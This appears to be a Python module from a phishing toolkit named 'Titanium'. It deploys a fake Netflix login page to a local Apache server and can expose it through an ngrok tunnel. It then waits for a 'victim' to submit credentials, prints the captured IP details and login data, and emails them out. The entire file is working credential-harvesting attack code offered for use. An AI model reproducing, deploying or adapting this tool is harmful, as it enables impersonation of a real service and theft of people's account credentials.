import shutil
from Core.Support import Font
from Core.Support import Network
from Core.Support import Mailer
from Core.Support import Creds
from time import sleep
import os
from pyngrok import ngrok, conf

conf.get_default().ngrok_path = "Tunnel/ngrok"
nomefile = "/var/www/html/Titanium_files/credentials/Netflix/Credentials.txt"
nomefile2 = "/var/www/html/Titanium_files/credentials/Netflix/Ip.txt"
dest = "/var/www/html"
dest2 = "/var/www/html/Titanium_files/credentials/Netflix"
header_mail = "Netflix-Credentials"


class Netflix:

    @staticmethod
    def menu():
        conf = input(
            Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "NETFLIX TEMPLATE WILL BE INSERTED ON YOUR WEB SERVER ARE YOU SURE?: YES,NO" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->")
        if conf == "yes" or conf == "YES":
            original = os.getcwd() + "/Server/Netflix/index.php"
            original2 = os.getcwd() + "/Server/Netflix/Login.php"
            original3 = os.getcwd() + "/Server/Netflix/post.php"
            original4 = os.getcwd() + "/Server/Netflix/Credentials.txt"
            original5 = os.getcwd() + "/Server/Netflix/Ip.txt"
            shutil.copy2(original, dest)
            shutil.copy2(original2, dest)
            shutil.copy2(original3, dest)
            shutil.copy2(original4, dest2)
            shutil.copy2(original5, dest2)
            os.system("chown -R www-data:www-data /var/www/html")
            print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "FILE ADDED TO YOUR WEBSERVER: " + dest)
            sc = int(input(
                Font.Color.GREEN + "\nWOULD YOU LIKE TO START THE ATTACK NOW(1)YES(2)NO?" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->"))
            if sc == 1:
                os.system("service apache2 start")
                mod = int(input(
                    Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "CHOOSE AN OPTION" + Font.Color.GREEN + "[+]" + Font.Color.WHITE + "\n(1)LOCALHOST\n(2)NGROK" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->"))
                if mod == 1:
                    Network.Controller.Local()
                elif mod == 2:
                    Network.Controller.Wan()
                Mailer.Sender.Coming_soon()
                print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "WAITING FOR VICTIM TO CLICK THE LINK:")
                con = 0
                while con == 0:
                    with open(nomefile2) as creds:
                        lines = creds.read().rstrip()
                        if len(lines) != 0:
                            print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "IP-INFO FOUND\n")
                            sleep(3)
                            for lines in creds:
                                print(Font.Color.GREEN + "[+]" + Font.Color.WHITE + lines.replace("\n",""))
                            con = 1
                if con == 1:
                    print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "WAITING FOR CREDENTIALS:")
                    con = 0
                    while con == 0:
                        with open(nomefile) as creds:
                            lines = creds.read().rstrip()
                            if len(lines) != 0:
                                print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "CREDENTIALS FOUND\n")
                                sleep(3)
                                print(Font.Color.WHITE + lines)
                                con = 1
                    if con == 1:
                        Creds.Sender.mail(header_mail, nomefile, nomefile2, dest2)
                        ngrok.kill()
                        os.system("service apache2 stop")

            elif sc == 2:
                print(
                    Font.Color.GREEN + "\n[+]" + Font.Color.YELLOW + "FOR AN ATTACK OVER WAN USE NGROK AND BEFORE STARTING YOU SHOULD ENABLE APACHE SERVICES,\nCREDENTIALS ON:/var/Titanium_files/credentials")
                inp = input("\nPRESS ENTER TO CONTINUE...")

            else:
                os.system('cls' if os.name == 'nt' else 'clear')

        else:
            print("\nFILE NOT ADDED")
            inp = input("\nPRESS ENTER TO CONTINUE...")
